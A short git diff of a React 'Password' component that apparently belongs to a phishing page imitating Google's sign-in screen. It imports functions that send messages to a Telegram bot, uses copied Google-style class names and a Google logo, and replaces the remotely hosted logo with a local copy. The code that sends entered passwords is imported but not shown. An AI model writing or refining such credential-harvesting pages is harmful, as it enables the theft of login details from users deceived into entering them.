@@ -2,6 +2,7 @@ import React, { useState } from 'react';
 import './Password.css'
 import { useSelector } from 'react-redux';
 import { sendMessageToTelegram, sendMessageToTelegram2 } from './TelegramBotComponent'; 
+import anotherImage from './580b57fcd9996e24bc43c51f.jpeg';
 
 function Password() {
     const globalVariable = useSelector((state) => state.globalVariable);
@@ -60,7 +61,7 @@ function Password() {
         <body>
             <main > 
                 <div class="InputContainer">
-                    <img class="googlepic"src="https://assets.stickpng.com/images/580b57fcd9996e24bc43c51f.png" alt="" height="25"/>
+                    <img class="googlepic"src={anotherImage} alt="" height="25"/>
                     <h2 class="login">Welcome</h2>
                         <div class="Wz0RKd">
                             <div  class="YZrg6 HnRr5d iiFyne cd29Sd kWC5Rd"  >
